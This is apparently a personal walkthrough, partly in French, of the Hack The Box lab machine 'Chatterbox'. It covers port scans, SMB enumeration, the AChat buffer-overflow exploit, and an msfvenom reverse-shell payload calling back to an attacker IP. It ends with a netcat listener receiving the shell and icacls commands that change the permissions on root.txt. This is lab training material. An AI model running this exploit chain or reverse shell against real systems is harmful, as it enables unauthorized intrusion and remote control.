\chapter{Chatterbox}
\begin{itemize}
    \item {\bf technics}: icacls
    \item {\bf Components}: 
    \item {\bf tools}: enum4linux-ng
\end{itemize}


\section{nmap}
\begin{verbatim}
$ nmapz 10.10.10.74
ports found: 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-27 01:34 CET
Nmap scan report for 10.10.10.74
Host is up (0.064s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  mon?
9256/tcp  open  unknown
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h40m00s, deviation: 2h53m14s, median: 4h59m59s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-01-27T05:35:56
|_  start_date: 2023-01-27T05:04:14
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-27T00:35:54-05:00
\end{verbatim}



\section{smb}
\begin{verbatim}
x$ smbclient -L //10.10.10.74 -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
\end{verbatim}

\verb+enum4linux-ng+ ne donne rien de plus

\section{msrpc}
\begin{verbatim}
$ rpcclient -U ""  10.10.10.47
Can't load /etc/samba/smb.conf - run testparm to debug it
Cannot connect to server.  Error was NT_STATUS_HOST_UNREACHABLE
\end{verbatim}


\section{9255 / 9256}

d'après \href{https://www.speedguide.net/port.php?port=9256}{speed guide Port
9256 Details} il faudrait check si on a de l'UDP sur le 9256

\begin{verbatim}
Achat is vulnerable to a SEH-based stack buffer overflow, caused by improper
bounds checking by AChat.exe. By sending a specially-crafted UDP packet to the
default port 9256 to overwrite the SEH handler, a remote attacker could
overflow a buffer and execute arbitrary code on the system or cause the
application to crash.
References: [EDB-36056], [XFDB-100845]
\end{verbatim}

\begin{verbatim}

benmusashi@honbu:~/documents/pentesting-games/htb/chatterbox$ sudo nmap -sUVC -p9256 -Pn 10.10.10.47
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-27 01:52 CET
Nmap scan report for 10.10.10.47
Host is up.

PORT     STATE         SERVICE VERSION
9256/udp open|filtered unknown
\end{verbatim}

\begin{verbatim}
$ searchsploit achat

---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow (M | windows/remote/36056.rb
Achat 0.150 beta7 - Remote Buffer Overflow    | windows/remote/36025.py
---------------------------------------------- -------------------------
searchsploit -m windows/remote/36025.py
\end{verbatim}

\begin{verbatim}
 msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.16.6 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python  
\end{verbatim}

rien ne passe aucun payload avec un ping back un curl ...

d'après le forum cela passe en switchant sur le VPN US et effectivement

\begin{verbatim}
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.74 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

C:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.

C:\Users\Administrator\Desktop>icacls ./
icacls ./
./ NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
   CHATTERBOX\Administrator:(I)(OI)(CI)(F)
   BUILTIN\Administrators:(I)(OI)(CI)(F)
   CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
C:\Users\Administrator\Desktop>icacls root.txt
icacls root.txt
root.txt CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files
>icacls root.txt /grant alfred:F
icacls root.txt /grant alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
\end{verbatim}
